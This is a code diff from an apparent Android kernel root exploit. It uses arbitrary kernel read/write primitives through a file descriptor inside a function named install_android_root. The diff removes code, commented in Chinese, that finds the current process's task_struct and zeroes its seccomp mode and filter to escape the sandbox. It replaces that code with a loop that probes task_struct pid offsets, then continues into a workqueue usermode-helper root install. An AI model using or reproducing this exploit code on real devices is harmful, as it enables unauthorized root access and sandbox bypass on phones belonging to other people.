@@ -302,33 +302,21 @@ static int install_workqueue_umh_root(int fd) {
 int install_android_root(int fd) {
   root_uid_before = getuid();
 
-  // ===== 强制关闭当前进程的 Seccomp =====
-  uint64_t task = kernel_read64(fd, INIT_TASK + 0x30); // tasks.next
-  pid_t my_pid = getpid();
-  uint64_t my_task = 0;
-
-  for (int i = 0; i < 2000 && task != 0; i++) {
-    uint64_t task_struct = task - 0x30;
-    uint32_t pid = 0;
-    kernel_read_data(fd, task_struct + 0x3a0, &pid, 4);
-    if (pid == (uint32_t)my_pid) {
-      my_task = task_struct;
-      break;
-    }
-    task = kernel_read64(fd, task_struct + 0x30);
+  // ===== 测试 pid 偏移量 =====
+  uintptr_t init_task_addr = data_addr(INIT_TASK);
+  uint32_t test_pid = 0;
+  
+  uint32_t pid_offsets[] = {
+    0x340, 0x348, 0x350, 0x358, 0x360, 0x368, 0x370, 0x378,
+    0x380, 0x388, 0x390, 0x398, 0x3a0, 0x3a8, 0x3b0, 0x3b8,
+    0x3c0, 0x3c8, 0x3d0, 0x3d8, 0x3e0, 0x3e8, 0x3f0, 0x3f8, 0x400
+  };
+  
+  for (int i = 0; i < sizeof(pid_offsets)/sizeof(pid_offsets[0]); i++) {
+    kernel_read_data(fd, init_task_addr + pid_offsets[i], &test_pid, 4);
+    pr_info("[*] init_task pid at offset 0x%x = %u\n", pid_offsets[i], test_pid);
   }
-
-  if (my_task != 0) {
-    uint32_t zero32 = 0;
-    uint64_t zero64 = 0;
-    kernel_write_data(fd, my_task + 0x358, &zero32, 4); // seccomp.mode
-    kernel_write_data(fd, my_task + 0x360, &zero64, 8); // seccomp.filter
-    pr_info("[*] seccomp disabled for pid=%d task=%016llx\n", my_pid,
-            (unsigned long long)my_task);
-  } else {
-    pr_warning("[*] seccomp disable failed: task not found\n");
-  }
-  // ===== Seccomp 关闭完毕 =====
+  // ===== 测试完毕 =====
 
   pr_info("root direct start uid=%u fd=%d\n", root_uid_before, fd);
   int installed = install_workqueue_umh_root(fd);
